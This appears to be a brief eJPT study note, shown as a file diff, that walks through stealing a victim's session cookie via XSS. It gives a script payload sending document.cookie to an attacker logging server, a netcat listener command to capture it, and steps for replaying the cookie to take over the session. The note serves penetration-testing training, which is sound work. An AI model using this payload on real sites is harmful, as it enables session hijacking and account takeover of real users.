@@ -1,0 +1,21 @@
+[eJPT]Hijack Cookie through XSS
+
+
+There are four components as follows:
+- Attacker Client PC
+- Attacker Logging Server
+- Vulnerable Server
+- Victim Client PC
+
+
+1) Attacker: first finds a Vulnerable Server and its breach point.
+
+2) Attacker: enter the following snippet in order to hijack the cookie kepts by Victim Client PC (P.S.: the IP address, 192.168.99.102, belongs to Attacker Logging Server in this example):
+<script>var i = new Image();i.src="http://192.168.99.102/log.php?q="+document.cookie;</script>
+
+3) Attacker: log into Attacker Logging Server (P.S.: it is 192.168.99.102 in this example), and execute the following command:
+#nc -vv -k -l -p 80
+
+4) Attacker: when Victim Client PC browses the Vulnerable Server, check the output of the command above.
+
+5) Attacker: after obtaining the victim's cookie, utilize a FireFox's Add-On called Cookie Quick Manager to change to the victim's cookie in an effort to hijack the victim's privilege.
